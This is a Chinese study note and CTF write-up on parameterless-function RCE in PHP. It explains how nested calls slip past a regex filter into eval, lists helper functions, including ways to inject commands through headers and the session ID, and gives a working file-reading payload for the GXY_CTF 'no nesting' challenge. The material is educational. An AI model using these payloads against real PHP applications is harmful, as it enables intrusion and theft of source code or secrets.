    鲲鹏杯做到了，没学过，做完之后再来总结补一下吧

    概念

    无参数函数RCE，即在不使用参数的条件下，仅使用函数进行RCE

    比如代码内出现这个：

     if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
     eval($_GET['code']);
 }

    这时如果我们用传统的eval($_POST[‘code’]); 则无法通过正则的校验 /[^\W]+((?R)?)/
    对于该正则只允许形如 a(b(c())); a();

    也就是只能使用函数套娃，里面的函数所产生的信息就是作为参数

    无参RCE相关变量和函数

    getenv()

    获取当前环境变量

    PHP中的$_ENV是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它。

    $_ENV只是被动的接受服务器端的环境变量并把它们转换为数组元素，你可以尝试直接输出它。

    get_defined_vars

    返回由所有已定义变量所组成的数组

    全局变量如[GLOBALS] [_POST] [_GET] [_COOKIE] [_FILES]也在其中

    通过获取这些变量中的恶意参数进行REC
    $_GET $_POST $_COOKIE

    通常都有全局过滤，可以尝试从$_FILES下手。

    array_rand

    从数组中随机取出一个或多个单元

    从数组中取值

    array_reverse

    返回单元顺序相反的数组

    array_flip　#

    交换数组中的键和值

    current　#

    返回数组中的当前单元

    getallheaders

    获取信息头，PHPSESSID

    从HTTP HEADER中获取信息（注入的恶意命令）并用于REC （apache2环境）

    例；

    执行var_dump(end(getallheaders()));时就可将请求头最后一个字段的内容当命令注

    session_id

    获取/设置当前会话 ID

    可获取PHPSESSID ，PHPSESSID允许字母和数字出现，可将payload转换为16进制字符串，当从cookies：PHPSESSID取出来后再通过hex2bin转回去，进行REC

    还有接下来这几个

    读取文件，目录遍历

    file_get_contents — 将整个文件读入一个字符串

    readfile — 输出文件
    读取文件并写入到输出缓冲。

    highlight_file()或show_source() — 语法高亮一个文件

    getcwd — 取得当前工作目录

    scandir — 列出指定路径中的文件和目录

    dirname

    返回路径中的目录部分

    例子：

    <?php
echo dirname("c:/testweb/home.php") . "<br />";
echo dirname("/testweb/home.php");
?>

    输出

    c:/testweb
/testweb

    chdir

    改变目录

    chdir(directory); directory 必需。规定新的当前目录

    GXY_CTF “禁止套娃”

    看看源码吧

     <?php
 include "flag.php";
 echo "flag在哪里呢？<br>";
 if(isset($_GET['exp'])){
     if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
         if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
             if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                 // echo $_GET['exp'];
                 @eval($_GET['exp']);
             }
             else{
                 die("还差一点哦！");
             }
         }
         else{
             die("再好好想想！");
         }
     }
     else{
         die("还想读flag，臭弟弟！");
     }
 }
 // highlight_file(__FILE__);
 ?>

    第一个if，进入检测exp参数

    第二个if，匹配data：等关键词，也就是增加黑名单

    第三个if，代替a-z的所有字母

    第四个if，匹配et、na等关键词，增加黑名单

    这里先给答案（函数真的好多好难记）

    ?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));

    接下来开始解释（工程量巨大）

    首先呢，preg_replace函数匹配的都是内容，没错，内容。

    所以调用的函数我们是不会被匹配的，要不然第三个if我们的函数就都会被代替为null，也就是空了

    localeconv()

    函数返回一二包含本地数字及货币格式信息的数组（注意这里是数组），数组的第一个值是 . (一个点)

    pos（） 也是current（） 这里我也不清楚为什么不用current，也没被匹配判断掉呀

    所以第一个

    pos(localeconv())套入就得到scandir(’.’)

    接下来

    scandir() 能够读取指定目录下的文件和目录

    .一个点现在就发挥作用了，就是当前目录

    运行一下这个

    ?exp=print_r(scandir(pos(localeconv())));

    他就以数组的形式输出了五个数组

    .(点) ..(点点) .git(一个文件) flag.php(文件) index.php(内置文件)

    也就是我们得到了当前目录

    接下来解释array_reverse和next

    array_reverse，字面意思，就是把数组的所有元素反序

    next：输出数组中的当前元素和下一个元素的值

    也就是输出第二个元素

    再来个小总结

    ?exp=print_r(next(array_reverse(scandir(pos(localeconv())))));

    最后show_source()

    就是将flag.php输出啦，php会处理好这个数组元素的，我们不用担心，说是元素，但是不是字符串嗷，他还是以变量在传递

    最后可以得到flag

    这是最基础的，所以这个可以当做一个基本模板记下来

    ?code=show_source(next(array_reverse(scandir(pos(localeconv())))));

?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
